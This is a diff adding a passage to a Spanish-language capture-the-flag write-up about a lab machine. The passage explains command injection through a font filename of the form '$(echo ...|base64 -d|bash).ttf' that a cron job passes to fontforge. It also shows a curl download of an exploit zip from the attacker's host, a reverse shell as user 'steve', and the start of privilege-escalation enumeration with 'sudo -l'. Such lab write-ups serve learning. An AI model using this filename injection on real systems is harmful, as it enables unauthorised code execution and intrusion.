@@ -222,4 +222,21 @@ En este se hace el siguiente paso:
 ```
   Cuando `$file` es `$(echo ...|base64 -d|bash).ttf`, el shell ejecuta primero lo que está dentro de `$()` antes de pasarlo a fontforge.
 
-Una vez lo tenemos listo, ejecutamos el script y el ``
+Una vez lo tenemos listo, ejecutamos el script y el `.zip` que obtenemos nos lo pasamos a la maquina al directorio sobre la que la tarea cron se esta ejecutando
+```shell
+curl http://10.10.15.158:80/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
+```
+
+Poniéndonos en escucha en el puerto indicado obtendremos una shell como `steve`
+
+Para ver la escalada de privilegios empezaremso enumerando sobre lo que tenemos permisos de root
+```shell
+sudo -l
+```
+
+Viendo los siguientes permisos:
+```shell
+ /usr/bin/python3 /opt/font-tools/install_validator.py *
+```
+
+
